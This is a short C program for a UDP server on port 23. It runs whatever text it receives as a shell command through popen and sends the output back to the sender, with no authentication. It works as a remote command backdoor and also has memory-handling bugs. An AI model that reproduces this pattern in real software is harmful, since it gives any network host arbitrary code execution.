// UDP Server
//
#include <stdio.h> 
#include <stdlib.h> 
#include <unistd.h> 
#include <string.h> 
#include <sys/types.h> 
#include <sys/socket.h> 
#include <arpa/inet.h> 
#include <netinet/in.h> 
  
#define PORT     23
#define MAXLINE 1024 
 
char  *sendFile(int *l, const char* command) { 
	FILE* fp;
	char  r[1024];
	int len = *l;
	char *result;
	result = (char *)calloc (len+1, sizeof(int));
	fp = popen(command,"r");
	if (fp == NULL)
		printf("Error\n");
	
	//len = strlen(command);
	

	while (fgets(r,len,fp)) {
		printf("Command: %s -> Result %s, LEN: %i \n",command, result, len);
		strcat(result,r);
	}

	printf("RESUL: %s",result);

	return result;
}

// Driver code 
int main() { 
    int sockfd;
    char buffer[MAXLINE];
    char *hello;
    char res[1024] = "Felao";
    struct sockaddr_in servaddr, cliaddr;
    //int len, n; 
    int n=0;
    socklen_t len;
    int commandLen = 1024;

    hello = res;

    // Creating socket file descriptor 
    if ( (sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0 ) { 
        perror("socket creation failed"); 
        exit(EXIT_FAILURE); 
    } 
      
    memset(&servaddr, 0, sizeof(servaddr)); 
    memset(&cliaddr, 0, sizeof(cliaddr)); 
      
    // Filling server information 
    servaddr.sin_family    = AF_INET; // IPv4 
    servaddr.sin_addr.s_addr = INADDR_ANY; 
    servaddr.sin_port = htons(PORT); 
      
    // Bind the socket with the server address 
    if ( bind(sockfd, (const struct sockaddr *)&servaddr,  
            sizeof(servaddr)) < 0 ) 
    { 
        perror("bind failed"); 
        exit(EXIT_FAILURE); 
    } 
     
  
    len = sizeof(cliaddr);  //len is value/resuslt 
  
    n = recvfrom(sockfd, (char *)buffer, MAXLINE,  
                MSG_WAITALL, ( struct sockaddr *) &cliaddr, 
                &len); 
    buffer[n] = '\0'; 
    printf("Client : %s\n", buffer); 
    //system (buffer);
    hello = sendFile(&commandLen,buffer);
    sendto(sockfd, (const char *)hello, strlen(hello),  
        MSG_CONFIRM, (const struct sockaddr *) &cliaddr, 
            len); 
    printf("Hello message sent.\n");  
    
   	printf("*******\n");
	printf("Result Len: %s\n",sendFile(&commandLen,buffer));
	printf("*******\n");

    return 0; 
} 